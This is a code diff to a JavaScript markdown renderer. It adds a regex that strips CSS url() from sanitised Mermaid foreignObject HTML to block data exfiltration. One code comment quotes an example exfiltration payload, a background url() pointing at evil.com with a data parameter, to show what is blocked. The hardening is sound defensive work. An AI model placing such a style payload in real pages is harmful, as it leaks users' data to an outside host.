@@ -585,14 +585,17 @@ export async function renderMarkdown() {
                 // The SVG structure itself (paths, rects, transforms) is safe - only the
                 // embedded HTML in foreignObject can contain malicious scripts/handlers
                 svgDoc.querySelectorAll('foreignObject').forEach(fo => {
-                    fo.innerHTML = DOMPurify.sanitize(fo.innerHTML, {
-                        // Allow tags Mermaid uses for text rendering
+                    // Strip url() from style attributes to prevent data exfiltration
+                    // but allow colors, backgrounds, positioning, etc.
+                    const sanitized = DOMPurify.sanitize(fo.innerHTML, {
                         ALLOWED_TAGS: ['div', 'span', 'p', 'br', 'b', 'i', 'strong', 'em', '#text'],
-                        // Allow attributes Mermaid needs: class, style, and xmlns for XHTML namespace
                         ALLOWED_ATTR: ['class', 'style', 'xmlns'],
-                        // Keep the content structure intact
                         KEEP_CONTENT: true,
                     });
+                    // Remove url() from any style attributes (blocks data exfiltration)
+                    // Allows: background-color: #fff; background: red;
+                    // Blocks: background: url(https://evil.com?data=...);
+                    fo.innerHTML = sanitized.replace(/url\s*\([^)]*\)/gi, '');
                 });
 
                 // Now safe to insert - foreignObject contents have been sanitized
